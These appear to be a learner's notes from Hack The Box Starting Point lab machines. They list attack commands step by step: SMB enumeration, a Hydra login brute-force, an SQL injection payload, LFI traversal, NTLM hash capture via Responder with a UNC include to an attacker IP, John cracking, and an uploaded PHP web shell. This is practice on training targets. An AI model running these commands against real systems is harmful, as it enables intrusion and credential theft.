# HTB Notes

## Starting Point Tier 0

Nmap basic list
`nmap -v1 -Pn 123.456.789.0`

SMB List Shares
`smbclient --list 10.129.49.171`

SMB List Folders
`smbmap -u root -p "" -H 10.129.49.171 -r`

SMB Folder Content
`smbmap -u root -p "" -H 10.129.49.171 -R WorkShares`

SMB Download files
`smbmap -u root -p "" -H 10.129.49.171 --download 'WorkShares\James.P\flag.txt'`

### Explosion

Unix RDP Connection
`xfreerdp /v:10.1.1.1 /u:administrator`

### Preignition

GoBuster find files / directories on Web Sever ending in PHP using Wordlist
`gobuster dir --url 10.129.38.239 --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php`

Hydra Login Form attack using HTTP Form Post
`hydra -l admin -P Passwords/2020-200_most_used_passwords.txt 10.129.116.45 http-post-form "/admin.php:username=^USER^&password=^PASS^:Wrong" -v`

### Mongod

Nmap scan all ports fast (does not work in nmapgui)
`nmap -p- --min-rate=1000 -sV {target_IP}`

MongoDB Shell Connect
`mongosh {target_IP}`

Mongo List Databases
`show databases`

Mongo Show Collection Content
`db.{collection_name}.find().pretty()`

### Synced

Rsync list shares
`rsync --list-only {target_IP}::`

Rsync copy file to local
`rsync 10.129.228.37::public/flag.txt ./flag.txt`

## Starting Point Tier 1

### Appointment

MySQL Injection Example Server query
`$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";`

Injection Attack
$username = admin
$password = ' OR 1=1 #
`$sql="SELECT * FROM users WHERE username='admin' AND password='' OR 1=1 #'";`

### Sequel
Mysql login broken / unable to login

### Crocodile
FTP Login
`ftp anonymous@{target_IP}`

FTP list / download
`ls` / `get`

### Responder
Web Server IP Redirection to URL, but URL inaccessible
echo "{target_IP} {target_URL}" >> /etc/hosts

Local File Inclusion
`http://unika.htb/index.php?page=FOOBAR`
No such file or directory in C:\xampp\htdocs\index.php
Access check at `http://unika.htb/index.php?page=../../../windows/system32/drivers/etc/hosts` successful
Or `http://unika.htb/index.php?page=../../../documents and settings/administrator/desktop/desktop.ini`

Using Responder to try and have webserver connect to us, proving NTLM Hash
`responder -I {network_interface}`
http://unika.htb/index.php?page=http://10.10.14.74
Answer: Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in C:\xampp\htdocs\index.php on line 11
Unable to include `http://` URLs

Run Gobuster with LFI List in Fuzz mode, trying to see which directories / files we can access
gobuster fuzz -w /usr/share/wordlists/seclists/Fuzzing/LFI/file_inclusion_windows.txt --url "http://unika.htb/index.php?page=" --exclude-length 0-700

Back to Responder:
Try to include File URL:
http://unika.htb/index.php?page=//10.10.14.74/file
Responder successfully captures Hash > hash.txt

Offline Crack NTLM hash using John the Ripper
John The Ripper available Hash Formats
`john --list=formats`
`john -w=/usr/share/wordlists/rockyou.txt --format=netntlmv2 ~/hash.txt`

With found Password and WinRM running, connect to target and grab flag
`evil-winrm -i 10.129.95.234 -u administrator -p badminton`

### Three
Subdomain Enumeration - DOES NOT WORK
Domain was added to /etc/hosts, so any DNS queries to that domain won't resolve
`gobuster dns --domain thetoppers.htb --wordlist /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt --threads 128`
instead use GoBuster vhost mode
`gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb/ --threads 128 --append-domain`

Use AWS CLI to list S3 files using found S3 endpoint
`aws --endpoint http://s3.thetoppers.htb s3 ls`

Create PHP Reverse Shell and upload it to web server via S3
`<?php system($_GET["cmd"]); ?>`
More advanced Reverse Shell at
https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/web/simple_php_web_shell_get_v2.php
Or Interactive Reverse Shell at
https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell-one-liner